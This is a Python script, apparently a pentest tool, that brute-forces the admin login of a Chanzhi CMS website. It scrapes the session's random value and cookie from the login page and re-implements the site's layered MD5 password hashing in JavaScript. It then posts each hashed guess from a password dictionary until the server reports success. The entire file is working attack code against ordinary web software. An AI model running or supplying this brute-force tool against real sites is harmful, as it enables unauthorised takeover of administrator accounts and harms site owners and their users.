# -*- coding: utf-8 -*-
# @Author  : aysec
# @Time    : 12/12/2023 00:00 PM
# @Describe: Calling JavaScript encryption and batch blasting

#pip install PyExecJS
'''
第一层加密为：调用自写md5算法加密password参数传递过来的字符 md5('123');
第二层加密为：调用自写md5算法加密第一次加密结果再加上account参数传递过来的字符串 md5(md5('123') + 'admin' );
第三层加密为：调用自写md5算法加密第二次加密结果再加上v.random随机字符串 md5(md5(md5('123') + 'admin' )+'xxx');
v.random 为一串随机字符，可以在控制台进行查找，这里的随机字符串失效时间为10分钟，也就是说在十分钟内爆破密码成功即可
'''

import re
import time
import execjs
import requests

def extract_random(url):
    #proxy = {'http': 'http://127.0.0.1:8080'}
    v_random = None  #初始变量
    res = requests.get(url)
    cookie = res.headers['Set-Cookie']
    text = res.text
    match = re.search(r'v\.random\s*=\s*"([^"]+)"', text)
    if match:
        v_random = match.group(1)
    return v_random, cookie

def JsCihper(account,v_random,pwd_dict):
    # name = []
    # f = open('top1000.txt','r').readlines()
    # for line in f:
    # name.append(line.replace('\n',''))
    #密文
    pwd = []
    dict = open(pwd_dict,'r').readlines()
    for line in dict:
        pwd.append(line.replace('\n',''))
    #打开js加密文件并调用js文件中md5加密函数进行加密
    with open('md5.js','r') as f:
        Js = execjs.compile(f.read())
    #密文
    ciphers = []
    for  i in pwd:
        cipher_1 = Js.call('md5', i)
        cipher_2 = Js.call('md5', cipher_1 + account)
        cipher = Js.call('md5', cipher_2 + v_random)
        #print(cipher)
        ciphers.append(cipher)
    #print(ciphers)
    return ciphers,pwd

def brute(account,cookie_segments,ciphers,proxy):
    result = None #初始变量
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
               'Accept':'application/json, text/javascript, */*; q=0.01',
               'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
               'Accept-Encoding':'gzip, deflate, br',
               'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
               'X-Requested-With':'XMLHttpRequest',
               'Referer':'http://x.x.x.x/chanzhi/admin.php?m=user&f=login',
               'Cookie':cookie_segments[0]
               }
    # 使用zip函数将两个列表的值联系起来
    # combined_list = list(zip(ciphers, pwd))
    # 使用enumerate函数为每个密文生成一个索引，并打印出原始值和密文
    for password in ciphers:
        data = {
            'account': account,
            'password': password,
            'referer':'http://x.x.x.x/chanzhi/admin.php?m=admin&f=index',
            'fingerprint':'622822521'
        }
        time.sleep(3)
        if proxy:
            proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'https://127.0.0.1:8080'
            }
            res = requests.post(url=url, headers=headers, data=data, proxies=proxies)
        else:
            res = requests.post(url=url, headers=headers, data=data)
        print(res.content.decode('unicode_escape'))
        if 'success' in res.text:
            result = password
            #print(result)
            break
        else:
            result = res.content.decode('unicode_escape')

    return result

def index_plaintext(ciphers,pwd,result):
    info = None #初始变量
    found_result = False  # 初始化标志变量为 False
    for index, encrypted_value in enumerate(ciphers):
        for index2, plaintext_value in enumerate(pwd):
            if index == index2 and result == encrypted_value and not found_result:
                #print("密文为：" + encrypted_value + "的明文是：" + plaintext_value)
                info = "密文为：" + encrypted_value + "的明文是：" + plaintext_value
                found_result = True  # 设置标志为 True，表示已经找到并打印过结果
    return info

if __name__ == '__main__':
    #全局变量
    proxy = False
    account = 'admin'
    pwd_dict = 'top10.txt'
    url = 'http://x.x.x.x/chanzhi/admin.php?m=user&f=login'
    try:
        #获取js所生成的随机值以及cookie值 - 发包测试发现v_random值根据Set-Cookie中adminsid值而变动，可以发现cookie中adminsid值对应着所提取的v_random值
        v_random, cookie = extract_random(url)
        #以分号分割
        cookie_segments = cookie.split("; ")
        #打印提取的随机值
        print(v_random)
        #打印对应生成随机值页面的cookie
        print(cookie_segments[0])
        #根据对方网站js加密算法进行加密并返回密文列表和明文列表
        ciphers, pwd = JsCihper(account,v_random,pwd_dict)
        #print(pwd)
        #print(ciphers)
        #根据加密的密码以及提取到的cookie值，构造数据包进行暴力破解
        result = brute(account,cookie_segments,ciphers,proxy)
        print("爆破密码返回结果："+result)
        #将密文和明文列表添加索引
        info = index_plaintext(ciphers,pwd,result)
        print(info)
    except Exception as e:
        print(f"error is {e}")
